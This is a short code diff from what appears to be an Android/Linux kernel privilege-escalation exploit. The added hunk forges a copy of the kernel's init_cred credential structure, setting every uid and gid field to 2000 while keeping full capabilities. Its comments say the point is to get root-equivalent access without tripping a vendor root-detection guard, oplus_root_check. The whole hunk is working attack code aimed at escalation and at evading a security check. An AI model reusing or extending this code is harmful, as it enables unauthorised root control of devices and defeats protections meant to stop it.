@@ -636,6 +636,25 @@ static void fill_init_cred_copy(unsigned char *p, size_t off) {
    * (page+0x1600) so the pi-erase's NULL-sibling up-walk terminates
    * (cc -> zeroslot -> NULL) instead of faulting on 0x40000000. */
   put64(c, 0, (uintptr_t)(p + 0x1600));
+  /*
+   * MODE4_CAPSONLY (diyiqiuye PFEM10 recipe, 2026-09-17): patch uid
+   * family to 2000 — oplus_root_check only kills on uid DROP edges and
+   * never reads capabilities. uid=2000 + 5×cap sets = 0x1FFFFFFFFFF =
+   * root-equivalent without triggering the guard. init_cred already
+   * has full caps; only the uid bytes need changing.
+   */
+  if (env_flag("MODE4_CAPSONLY", 0)) {
+    uint32_t cu = (uint32_t)env_int_range("MODE4_CAPS_UID", 2000, 0, 65535);
+    put32(c, 0x04, cu); /* uid */
+    put32(c, 0x08, cu); /* gid */
+    put32(c, 0x0c, cu); /* suid */
+    put32(c, 0x10, cu); /* sgid */
+    put32(c, 0x14, cu); /* euid */
+    put32(c, 0x18, cu); /* egid */
+    put32(c, 0x1c, cu); /* fsuid */
+    put32(c, 0x20, cu); /* fsgid */
+    pr_info("CAPSONLY cred: uid=%u (guard-safe) caps=full\n", cu);
+  }
 }
 
 /* Resolve symbol image VA from runtime offsets table when available.
